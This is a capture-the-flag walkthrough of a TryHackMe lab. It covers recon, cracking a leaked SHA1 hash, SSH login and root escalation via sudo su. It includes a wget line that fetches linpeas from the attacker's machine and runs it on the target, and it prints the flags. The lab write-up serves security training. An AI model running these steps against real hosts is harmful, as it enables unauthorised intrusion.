# CCpentesting 

link to the room : [https://tryhackme.com/room/ccpentesting]

`export IP=10.10.118.194`

## Recon

### Nmap

command: `sudo nmap -sC -sV -v -O -oN recon/nmap $IP`

output:

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### GoBuster
command: `docker run -v ~/Personal/tools/wordlists/:/wordlists gobuster dir -u http://$IP -w /wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,css,cgi,sh,py -t 50 > recon/gobuster`

output:

```
/secret               (Status: 301) [Size: 311] [--> http://10.10.92.59/secret/]

```
command: `docker run -v /usr/share/dirb/wordlists:/wordlists gobuster dir -u http://$IP/secret -w /wordlists/common.txt -x php,html,js,css,cgi,sh,py,txt -t 50 > recon/gobuster.v2`

output:

```
/secret.txt           (Status: 200) [Size: 46] 
```
- the file content is : `nyan:046385855FC9580393853D8E81F240B66FE9A7B8`

### Nikto
command: `docker run sullo/nikto -h $IP > recon/nikto`

output: 
```
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.41). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3092: /secret/: This might be interesting.
+ OSVDB-3233: /icons/README: Apache default file found.
```

## TASK

### 1. first flag:
- the `secret.txt` file content is : `nyan:046385855FC9580393853D8E81F240B66FE9A7B8`


#### hashcat
command: `hashcat -m 100 046385855FC9580393853D8E81F240B66FE9A7B8  ~/Personal/tools/wordlists/rockyou.txt`

output: nyan

### searchsploit
- there is a module for OpenSSH 7.2p2 which enumerate users let's try it with nyan
command: `./searchsploit -m 40136`
- we can connect to ssh via `ssh nyan@$IP` with password `nyan`

- found `user.txt` with content `supernootnoot`

### 2. second flag:

### PrivEscl

- check with linpeas: 
    - local command: `sudo python3 -m http.server`
    - remote command: `wget 10.9.2.243:8000/linpeas.sh -O /dev/shm/linpeas.sh`
    - remote command: `chmod +x linpeas.sh && ./linpeas.sh`

output:
```
OS: Linux version 4.4.0
Sudo version 1.8.16
apache2 process found (dump creds from memory as root)
sshd: process found (dump creds from memory as root)
(root) NOPASSWD: /bin/su
/etc/apache2/sites-available/default-ssl.conf:		#	 file needs this password: `xxj31ZMTZzkVA'
```

- we can execute su as admin so `sudo su` privesc to root
- `root.txt` content is `congratulations!!!!`